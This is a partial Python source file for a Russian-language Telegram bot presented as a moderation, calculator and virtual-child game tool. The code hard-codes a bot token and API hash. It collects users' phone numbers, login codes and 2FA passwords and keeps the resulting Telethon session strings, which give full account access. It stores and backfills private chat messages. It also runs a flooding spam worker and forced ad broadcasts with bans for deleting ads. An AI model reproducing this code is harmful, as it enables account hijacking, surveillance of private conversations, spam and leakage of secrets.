import asyncio
import os
import psycopg2
import re
import logging
import math
from datetime import datetime, timezone, timedelta
from typing import Dict, Set, List, Optional, Tuple

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ReplyKeyboardRemove, KeyboardButton,
    ReplyKeyboardMarkup
)
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiohttp import web

from telethon import TelegramClient, events, utils as tl_utils
from telethon.sessions import StringSession
from telethon.tl.types import User, Chat, Channel
from telethon.errors import (
    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError,
    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
)

# ==================== КОНФИГ ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

BOT_TOKEN = "8959860095:AAEnbAbGuCBWYQHCAF3uPaMD8y1It1IBby8"
ADMIN_ID = 5825717381
DATABASE_URL = os.environ.get('DATABASE_URL')

API_ID = 39536916
API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"

OWNER_TG_LINK = "https://t.me/NorikAmiri"
CHANNEL_URL = "https://t.me/norikX"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== ХРАНИЛИЩА ====================
mutes = {}
spam_tasks = {}
user_spam_texts = {}
link_chats = set()
reply_guard_chats = set()
typing_disabled_chats = set()
substitutions = {}
msg_cache = {}
active_chats = {}
promo_messages = {}
recent_business_chats = []
bc_owners = {}
user_usernames = {}
user_names = {}
banned_users = set()
bot_id = None
CHANNEL_LINK = None
manual_added_users = set()
telethon_clients: Dict[int, TelegramClient] = {}
user_dialogs: Dict[int, List[Tuple[int, str]]] = {}
backfill_tasks: Dict[int, asyncio.Task] = {}

# ==================== СОСТОЯНИЯ FSM ====================
class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

# ==================== ТЕКСТЫ ====================
MANUAL_INSTRUCTION = (
    "🚀 <b>Инструкция по подключению бота:</b>\n\n"
    "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
    "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
    "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
    "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
    "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
    "📢 <b>Условия использования:</b>\n"
    "• Бот публикует рекламу 1 раз в 8 часов\n"
    "• Удаление рекламного сообщения = блокировка\n"
    "• Вы соглашаетесь с этим, подключая бота"
)

TEXT_COMMANDS_HELP = (
    "📋 <b>СПИСОК КОМАНД:</b>\n\n"
    "🔹 <b>Спам:</b>\n"
    "• <code>set [текст]</code> — задать текст для спама\n"
    "• <code>ss</code> — запустить спам\n"
    "• <code>dd</code> — остановить спам\n\n"
    "🔹 <b>Модерация:</b>\n"
    "• <code>.мут [минуты]</code> — мут\n"
    "• <code>.размут</code> — размут\n"
    "• <code>печать +</code> / <code>печать -</code> — печать\n"
    "• <code>подмена [текст] [1/2/выкл]</code> — подмена\n"
    "• <code>.старт</code> / <code>.стоп</code> — авто-ссылка\n"
    "• <code>+реплай</code> / <code>-реплай</code> — защита от реплаев\n"
    "• <code>+линк [ссылка]</code> — установить ссылку\n"
    "• <code>мой ид</code> / <code>твой ид</code> — узнать ID\n"
    "• <code>!команды</code> — меню\n\n"
    "🔹 <b>Калькулятор:</b>\n"
    "• Просто напишите пример: <code>1458+2414</code>"
)

# ==================== КОНСТАНТЫ РЕБЁНКА ====================
NEEDS = ["hunger", "toilet", "sleep_need", "hygiene", "mood", "attention"]
NEED_LABELS = {
    "hunger": ("Голод", "🍖"), "toilet": ("Туалет", "🚽"),
    "sleep_need": ("Сон", "😴"), "hygiene": ("Гигиена", "🛁"),
    "mood": ("Настроение", "🙂"), "attention": ("Внимание", "🫂"),
}
DECAY_PER_TICK = {"hunger": 3, "toilet": 4, "sleep_need": 2, "hygiene": 2, "mood": 2, "attention": 2}
TICK_MINUTES = 30
REMINDER_THRESHOLD = 25
HEALTH_DECAY_IF_CRITICAL = 3
HEALTH_REGEN_IF_OK = 1
GAME_YEAR_IN_REAL_DAYS = 4
REMINDER_PHRASES = {
    "hunger": "хочу кушать 🍖", "toilet": "мне нужно в туалет 🚽",
    "sleep_need": "я хочу спать 😴", "hygiene": "я хочу помыться 🛁",
    "mood": "мне скучно, поиграй со мной 🙂", "attention": "мне не хватает внимания 🫂",
}
ACTION_LABELS = {
    "hunger": "Покормить", "toilet": "Сводить в туалет", "sleep_need": "Уложить спать",
    "hygiene": "Помыть", "mood": "Поиграть", "attention": "Пообщаться",
}
BIRTH_RULES_TEXT = (
    "У {gender_word_small} есть потребности, и они настоящие — \n"
    "за ними правда нужно следить.\n"
    "Если не следить за ребёнком, \n"
    "он может умереть, \n"
    "и это уже никак не исправить.\n\n"
    "Береги {pronoun_acc} 🙂"
)
RESTORE_AMOUNT = {"hunger": 40, "toilet": 50, "sleep_need": 35, "hygiene": 45, "mood": 30, "attention": 30}

# ==================== БАЗА ДАННЫХ ====================
def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))""")
                cur.execute("""CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS user_chats (user_id BIGINT, chat_id BIGINT, chat_name TEXT, PRIMARY KEY (user_id, chat_id))""")
                cur.execute("""CREATE TABLE IF NOT EXISTS children (
                    id SERIAL PRIMARY KEY, owner_id BIGINT NOT NULL, name TEXT NOT NULL, gender TEXT NOT NULL,
                    health INTEGER NOT NULL DEFAULT 100, hunger INTEGER NOT NULL DEFAULT 100,
                    toilet INTEGER NOT NULL DEFAULT 100, sleep_need INTEGER NOT NULL DEFAULT 100,
                    hygiene INTEGER NOT NULL DEFAULT 100, mood INTEGER NOT NULL DEFAULT 100,
                    attention INTEGER NOT NULL DEFAULT 100, is_alive BOOLEAN NOT NULL DEFAULT TRUE,
                    birth_date DATE NOT NULL DEFAULT CURRENT_DATE, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_birthday_year INTEGER NOT NULL DEFAULT 0)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS chat_messages (
                    id SERIAL PRIMARY KEY, user_id BIGINT NOT NULL, chat_id BIGINT NOT NULL,
                    sender_id BIGINT, sender_name TEXT, sender_username TEXT, text TEXT,
                    message_id BIGINT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(user_id, chat_id, message_id))""")
                cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_user_chat ON chat_messages(user_id, chat_id)")
                cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_created ON chat_messages(created_at)")
                conn.commit()

                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                for row in cur.fetchall(): link_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
                for row in cur.fetchall(): reply_guard_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='typing_disabled'")
                for row in cur.fetchall(): typing_disabled_chats.add(int(row[0]))
                cur.execute("SELECT chat_id, text, mode FROM substitutions")
                for row in cur.fetchall(): substitutions[int(row[0])] = {"text": row[1], "mode": row[2]}
                cur.execute("SELECT key_id, text FROM spam_texts")
                for row in cur.fetchall(): user_spam_texts[str(row[0])] = row[1]
                cur.execute("SELECT user_id FROM banned_users")
                for row in cur.fetchall(): banned_users.add(int(row[0]))
                cur.execute("SELECT user_id, username, first_name FROM user_map")
                for row in cur.fetchall():
                    uid, uname, fname = int(row[0]), row[1], row[2]
                    if uname: user_usernames[uname.lower()] = uid
                    if fname: user_names[uid] = fname
                cur.execute("SELECT user_id FROM manual_users")
                for row in cur.fetchall(): manual_added_users.add(int(row[0]))
                cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
                for row in cur.fetchall():
                    uid = int(row[0]); cid = int(row[1]); name = row[2] if len(row) > 2 else "Чат"
                    user_dialogs.setdefault(uid, []).append((cid, name))
                logging.info("✅ БД инициализирована")
    except Exception as e:
        logging.error(f"❌ Ошибка БД: {e}")

# ==================== ФУНКЦИИ БД ====================
def save_user_chat(user_id, chat_id, chat_name):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name = EXCLUDED.chat_name",
                    (user_id, chat_id, chat_name))
                conn.commit()
        lst = user_dialogs.setdefault(user_id, [])
        for i, (cid, _) in enumerate(lst):
            if cid == chat_id:
                lst[i] = (chat_id, chat_name); return
        lst.append((chat_id, chat_name))
    except Exception as e:
        logging.error(f"save_user_chat: {e}")

def get_user_chats(user_id):
    if user_id in user_dialogs and user_dialogs[user_id]:
        return user_dialogs[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id = %s", (user_id,))
                chats = [(int(r[0]), r[1]) for r in cur.fetchall()]
                user_dialogs[user_id] = chats
                return chats
    except Exception as e:
        logging.error(f"get_user_chats: {e}")
        return []

def delete_user_chat(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
                conn.commit()
                if user_id in user_dialogs:
                    user_dialogs[user_id] = [c for c in user_dialogs[user_id] if c[0] != chat_id]
    except Exception as e:
        logging.error(f"delete_user_chat: {e}")

def delete_all_user_chats(user_id):
    count = 0
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id=%s", (user_id,))
                count = cur.rowcount
                conn.commit()
                if user_id in user_dialogs: user_dialogs[user_id] = []
    except Exception as e:
        logging.error(f"delete_all_user_chats: {e}")
    return count

def get_business_accounts():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
                return cur.fetchall()
    except Exception as e:
        logging.error(f"get_business_accounts: {e}")
        return []

def save_session(user_id, session_str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_sessions (user_id, session_string) VALUES (%s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET session_string = EXCLUDED.session_string",
                    (user_id, session_str))
                conn.commit()
    except Exception as e:
        logging.error(f"save_session: {e}")

def get_session(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT session_string FROM user_sessions WHERE user_id = %s", (user_id,))
                row = cur.fetchone()
                return row[0] if row else None
    except Exception as e:
        logging.error(f"get_session: {e}")
        return None

def get_all_sessions():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, session_string FROM user_sessions")
                return cur.fetchall()
    except Exception as e:
        logging.error(f"get_all_sessions: {e}")
        return []

def delete_session(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_sessions WHERE user_id=%s", (user_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"delete_session: {e}")

def save_business_account(user_id, username, first_name):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
                    (user_id, username, first_name))
                conn.commit()
    except Exception as e:
        logging.error(f"save_business_account: {e}")

def get_all_users():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT user_id, username, first_name, connected_at, 'business' as type FROM business_accounts
                    UNION
                    SELECT user_id, username, first_name, added_at, 'manual' as type FROM manual_users
                    ORDER BY connected_at DESC""")
                return cur.fetchall()
    except Exception as e:
        logging.error(f"get_all_users: {e}")
        return []

def delete_business_account(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM business_accounts WHERE user_id=%s", (user_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"delete_business_account: {e}")

def save_user_info(user_id, username, first_name):
    user_id = int(user_id)
    if first_name: user_names[user_id] = first_name
    username_clean = username.lstrip("@").lower() if username else None
    if username_clean: user_usernames[username_clean] = user_id
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_map (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = COALESCE(EXCLUDED.username, user_map.username), "
                    "first_name = COALESCE(EXCLUDED.first_name, user_map.first_name)",
                    (user_id, username_clean, first_name))
                conn.commit()
    except Exception as e:
        logging.error(f"save_user_info: {e}")

def set_user_ban(user_id, ban):
    user_id = int(user_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if ban:
                    cur.execute("INSERT INTO banned_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
                    banned_users.add(user_id)
                else:
                    cur.execute("DELETE FROM banned_users WHERE user_id=%s", (user_id,))
                    banned_users.discard(user_id)
                conn.commit()
    except Exception as e:
        logging.error(f"set_user_ban: {e}")

def save_setting(chat_id, setting_type, enabled):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if enabled:
                    cur.execute("INSERT INTO chat_settings (chat_id, setting_type) VALUES (%s, %s) ON CONFLICT DO NOTHING", (chat_id, setting_type))
                else:
                    cur.execute("DELETE FROM chat_settings WHERE chat_id=%s AND setting_type=%s", (chat_id, setting_type))
                conn.commit()
        target = link_chats if setting_type == 'enabled_links' else (reply_guard_chats if setting_type == 'reply_guard' else typing_disabled_chats)
        target.add(chat_id) if enabled else target.discard(chat_id)
    except Exception as e:
        logging.error(f"save_setting: {e}")

def save_substitution(chat_id, text, mode):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if text is None:
                    cur.execute("DELETE FROM substitutions WHERE chat_id=%s", (chat_id,))
                    substitutions.pop(chat_id, None)
                else:
                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s, %s, %s) ON CONFLICT (chat_id) DO UPDATE SET text = EXCLUDED.text, mode = EXCLUDED.mode", (chat_id, text, mode))
                    substitutions[chat_id] = {"text": text, "mode": mode}
                conn.commit()
    except Exception as e:
        logging.error(f"save_substitution: {e}")

def save_spam_text(key_id, text):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s, %s) ON CONFLICT (key_id) DO UPDATE SET text = EXCLUDED.text", (str(key_id), text))
                conn.commit()
        user_spam_texts[str(key_id)] = text
    except Exception as e:
        logging.error(f"save_spam_text: {e}")

def get_user_mention(user_id, fallback_name=None):
    user_id = int(user_id)
    fname = user_names.get(user_id) or fallback_name or "Пользователь"
    return f'<a href="tg://user?id={user_id}">{fname}</a>'

def mark_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO delivered_promo (chat_id) VALUES (%s) ON CONFLICT DO NOTHING", (chat_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"mark_chat_promo_delivered: {e}")

def is_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT 1 FROM delivered_promo WHERE chat_id=%s", (chat_id,))
                return cur.fetchone() is not None
    except Exception as e:
        return False

# ==================== ФУНКЦИИ ПЕРЕПИСКИ ====================
def save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username, text, message_id):
    """Сохраняет сообщение. Логирует ошибки. Возвращает True/False."""
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO chat_messages (user_id, chat_id, sender_id, sender_name, sender_username, text, message_id) "
                    "VALUES (%s,%s,%s,%s,%s,%s,%s) ON CONFLICT DO NOTHING",
                    (int(user_id), int(chat_id), int(sender_id) if sender_id else 0,
                     sender_name, sender_username, (text or "")[:2000], int(message_id)))
                conn.commit()
        return True
    except Exception as e:
        logging.error(f"❌ save_chat_message user={user_id} chat={chat_id} msg={message_id}: {e}")
        return False

def get_chat_messages(user_id, chat_id, page=0, per_page=15):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT sender_id, sender_name, sender_username, text, created_at "
                    "FROM chat_messages WHERE user_id=%s AND chat_id=%s "
                    "ORDER BY id DESC LIMIT %s OFFSET %s",
                    (user_id, chat_id, per_page, page * per_page))
                rows = cur.fetchall()
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
                total = cur.fetchone()[0]
                return list(reversed(rows)), total
    except Exception as e:
        logging.error(f"get_chat_messages: {e}")
        return [], 0

def count_user_messages(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s", (user_id,))
                return cur.fetchone()[0]
    except Exception:
        return 0

def clear_chat_messages(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
                conn.commit()
    except Exception as e:
        logging.error(f"clear_chat_messages: {e}")

init_db()

# ==================== ВСПОМОГАТЕЛЬНЫЕ ====================
async def delete_msg(chat_id, msg_id, bc_id):
    if bc_id:
        try:
            await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[msg_id])
            return
        except: pass
    try:
        await bot.delete_message(chat_id, msg_id)
    except: pass

async def edit_message(chat_id, msg_id, text, bc_id, parse_mode=None):
    try:
        kwargs = {"chat_id": chat_id, "message_id": msg_id, "text": text,
                  "parse_mode": parse_mode, "disable_web_page_preview": True}
        if bc_id: kwargs["business_connection_id"] = bc_id
        await bot.edit_message_text(**kwargs)
        return True
    except Exception as e:
        logging.warning(f"edit_message: {e}")
        return False

async def clear_cmd(chat_id, msg_id, bc_id):
    await delete_msg(chat_id, msg_id, bc_id)

async def global_typing_loop():
    while True:
        try:
            for bc_id, chats in list(active_chats.items()):
                for cid in list(chats)[-50:]:
                    if cid not in typing_disabled_chats:
                        try: await bot.send_chat_action(chat_id=cid, action="typing", business_connection_id=bc_id)
                        except: pass
            await asyncio.sleep(4)
        except Exception as e:
            logging.error(f"typing: {e}")
            await asyncio.sleep(4)

async def spam_worker(chat_id, bc_id, reply_to, text):
    try:
        words = text.split()
        while True:
            for word in words:
                kwargs = {"chat_id": chat_id, "text": word, "reply_to_message_id": reply_to}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
                await asyncio.sleep(0.3)
    except asyncio.CancelledError: pass

async def unmute(user_id, chat_id, bc_id, user_name):
    if user_id in mutes:
        await asyncio.sleep((mutes[user_id]["until"] - datetime.now()).total_seconds())
        if user_id in mutes and datetime.now() >= mutes[user_id]["until"]:
            mutes.pop(user_id, None)
            user_link = get_user_mention(user_id, user_name)
            kwargs = {"chat_id": chat_id, "text": f"🔊 С {user_link} снят <b>МУТ</b>.", "parse_mode": "HTML"}
            if bc_id: kwargs["business_connection_id"] = bc_id
            try: await bot.send_message(**kwargs)
            except: pass

async def promo_broadcaster():
    promo_text = "Можешь, пожалуйста, на наш канал подписаться? Если не трудно ❤️"
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]])
    while True:
        await asyncio.sleep(28800)
        selected = []
        for chat_info in reversed(recent_business_chats[-100:]):
            if len(selected) >= 20: break
            cid, bc_id = chat_info
            owner_id = bc_owners.get(bc_id)
            if owner_id == ADMIN_ID or (owner_id and owner_id in banned_users): continue
            if is_chat_promo_delivered(cid): continue
            selected.append(chat_info)
        for cid, bc_id in selected:
            try:
                msg = await bot.send_message(chat_id=cid, text=promo_text, parse_mode="HTML",
                                             reply_markup=promo_kb, business_connection_id=bc_id)
                promo_messages[(cid, bc_id)] = msg.message_id
                mark_chat_promo_delivered(cid)
            except Exception as e:
                logging.warning(f"promo: {e}")
            await asyncio.sleep(3)

async def check_promo_deletions():
    unban_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Написать владельцу", url=OWNER_TG_LINK)]])
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]])
    while True:
        await asyncio.sleep(15)
        for (cid, bc_id), msg_id in list(promo_messages.items()):
            owner_id = bc_owners.get(bc_id)
            if owner_id and owner_id in banned_users: continue
            try:
                await bot.edit_message_reply_markup(chat_id=cid, message_id=msg_id, reply_markup=promo_kb, business_connection_id=bc_id)
            except TelegramBadRequest as e:
                err = str(e).lower()
                if "message to edit not found" in err or "message can't be edited" in err:
                    if owner_id:
                        set_user_ban(owner_id, True)
                        try:
                            await bot.send_message(chat_id=owner_id, text="🚫 Вы забанены за удаление рекламы!",
                                                   parse_mode="HTML", reply_markup=unban_kb)
                        except: pass
                    promo_messages.pop((cid, bc_id), None)
            except: pass

async def clean_inactive_connections():
    while True:
        await asyncio.sleep(300)
        inactive = []
        for bc_id in list(bc_owners.keys()):
            try: await bot.get_business_connection(bc_id)
            except Exception: inactive.append(bc_id)
        for bc_id in inactive:
            bc_owners.pop(bc_id, None)
            active_chats.pop(bc_id, None)
            for key in list(spam_tasks.keys()):
                if key[1] == bc_id:
                    spam_tasks[key].cancel(); del spam_tasks[key]
            recent_business_chats[:] = [i for i in recent_business_chats if i[1] != bc_id]

def calculate_expression(expression):
    try:
        expr = expression.replace(" ", "")
        if not re.match(r'^[\d+\-*/()%**sqrt.]+$', expr): return None, "❌ Некорректное выражение"
        expr = expr.replace("sqrt", "math.sqrt")
        result = eval(expr, {"math": math, "__builtins__": None})
        if result is None: return None, "❌ Ошибка вычисления"
        if isinstance(result, float):
            result = int(result) if result.is_integer() else round(result, 10)
        return result, None
    except ZeroDivisionError: return None, "❌ Деление на ноль!"
    except Exception as e: return None, f"❌ Ошибка: {str(e)}"

def is_calculator_expression(text):
    if not text: return False
    cleaned = text.replace(" ", "")
    if not re.search(r"\d", cleaned): return False
    if not re.search(r"[+\-*/%]", cleaned): return False
    if not re.fullmatch(r"[\d\.\+\-\*/\(\)%]+", cleaned): return False
    if re.fullmatch(r"[\+\-\*/%\.]+", cleaned): return False
    return True

# ==================== ФУНКЦИИ РЕБЁНКА ====================
def get_alive_child(owner_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, name, gender, health, hunger, toilet, sleep_need, hygiene, mood, attention, birth_date, last_birthday_year FROM children WHERE owner_id=%s AND is_alive=TRUE", (owner_id,))
                row = cur.fetchone()
                if not row: return None
                keys = ["id", "name", "gender", "health", "hunger", "toilet", "sleep_need", "hygiene", "mood", "attention", "birth_date", "last_birthday_year"]
                return dict(zip(keys, row))
    except Exception as e:
        logging.error(f"get_alive_child: {e}")
        return None

def create_child(owner_id, name, gender):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO children (owner_id, name, gender) VALUES (%s, %s, %s) RETURNING id, birth_date", (owner_id, name, gender))
                child_id, birth_date = cur.fetchone()
                conn.commit()
                return {"id": child_id, "name": name, "gender": gender, "birth_date": birth_date}
    except Exception as e:
        logging.error(f"create_child: {e}")
        return None

def update_child_field(child_id, field, value):
    value = max(0, min(100, value))
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(f"UPDATE children SET {field}=%s WHERE id=%s", (value, child_id))
                conn.commit()
    except Exception as e:
        logging.error(f"update_child_field: {e}")

def update_child_full(child_id, health, needs):
    health = max(0, min(100, health))
    needs = {k: max(0, min(100, v)) for k, v in needs.items()}
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET health=%s, hunger=%s, toilet=%s, sleep_need=%s, hygiene=%s, mood=%s, attention=%s WHERE id=%s",
                            (health, needs["hunger"], needs["toilet"], needs["sleep_need"], needs["hygiene"], needs["mood"], needs["attention"], child_id))
                conn.commit()
    except Exception as e:
        logging.error(f"update_child_full: {e}")

def kill_child(child_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET is_alive=FALSE WHERE id=%s", (child_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"kill_child: {e}")

def get_all_alive_children_full():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, owner_id, name, gender, health, hunger, toilet, sleep_need, hygiene, mood, attention, birth_date, last_birthday_year FROM children WHERE is_alive=TRUE")
                rows = cur.fetchall()
                keys = ["id", "owner_id", "name", "gender", "health", "hunger", "toilet", "sleep_need", "hygiene", "mood", "attention", "birth_date", "last_birthday_year"]
                return [dict(zip(keys, r)) for r in rows]
    except Exception as e:
        logging.error(f"get_all_alive_children_full: {e}")
        return []

def set_last_birthday_year(child_id, year):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET last_birthday_year=%s WHERE id=%s", (year, child_id))
                conn.commit()
    except Exception as e:
        logging.error(f"set_last_birthday_year: {e}")

def get_game_age(birth_date):
    if isinstance(birth_date, datetime): birth_date = birth_date.date()
    real_days = (datetime.now(timezone.utc).date() - birth_date).days
    game_days = (real_days / GAME_YEAR_IN_REAL_DAYS) * 365
    return int(game_days // 365), int((game_days % 365) // 30)

def age_stage_word(years):
    if years < 1: return "младенец 👶"
    elif years < 5: return "малыш 🧒"
    elif years < 12: return "ребёнок 🧒"
    else: return "подросток 🧑"

def bar(value, length=10):
    filled = round(value / 100 * length)
    return "▓" * filled + "░" * (length - filled)

def child_status_text(child):
    years, months = get_game_age(child["birth_date"])
    gender_word = "Сын" if child["gender"] == "m" else "Дочь"
    lines = [f"👶 {gender_word}: {child['name']} — {years} г. {months} мес. ({age_stage_word(years)})",
             f"❤️ Здоровье:  {bar(child['health'])} {child['health']}"]
    for key in NEEDS:
        label, emoji = NEED_LABELS[key]
        lines.append(f"{emoji} {label}: {bar(child[key])} {child[key]}")
    return "\n".join(lines)

def child_action_keyboard(child_id, highlight=None):
    rows, pair = [], []
    for key in NEEDS:
        text = ACTION_LABELS[key]
        if key == highlight: text = "👉 " + text
        pair.append(InlineKeyboardButton(text=text, callback_data=f"child_{key}_{child_id}"))
        if len(pair) == 2:
            rows.append(pair); pair = []
    if pair: rows.append(pair)
    rows.append([InlineKeyboardButton(text="💊 Полечить", callback_data=f"child_heal_{child_id}")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def birth_rules_text(name, gender, birth_date):
    gender_word = "него" if gender == "m" else "неё"
    pronoun_acc = "его" if gender == "m" else "её"
    born_word = "родился" if gender == "m" else "родилась"
    who_word = "Сын" if gender == "m" else "Дочь"
    date_str = birth_date.strftime("%d.%m.%Y") if hasattr(birth_date, "strftime") else str(birth_date)
    return (f"🎉 Поздравляю, {born_word} {who_word.lower()} — {name}!\n"
            f"День рождения: {date_str}\n\n"
            + BIRTH_RULES_TEXT.format(gender_word_small=gender_word, pronoun_acc=pronoun_acc))

# ==================== TELETHON ====================
def normalize_chat_id(event_or_dialog):
    """Возвращает нормализованный ID чата."""
    try:
        if hasattr(event_or_dialog, "chat_id"):
            cid = event_or_dialog.chat_id
            if cid is not None:
                return int(cid)
        if hasattr(event_or_dialog, "id"):
            return int(event_or_dialog.id)
    except: pass
    return None

async def extract_sender_info(message):
    """Возвращает (sender_id, sender_name, sender_username) безопасно."""
    sender_id = 0
    sender_name = "Unknown"
    sender_username = ""
    try:
        s = await message.get_sender()
        if s:
            sender_id = int(getattr(s, 'id', 0) or 0)
            sender_name = getattr(s, 'first_name', None) or getattr(s, 'title', None) or "Unknown"
            sender_username = getattr(s, 'username', '') or ''
    except Exception as e:
        logging.debug(f"extract_sender_info: {e}")
    if not sender_id:
        try:
            sender_id = int(getattr(message, 'sender_id', 0) or 0)
        except: pass
    return sender_id, sender_name, sender_username

async def backfill_one_chat(client, user_id, chat_id, limit=100):
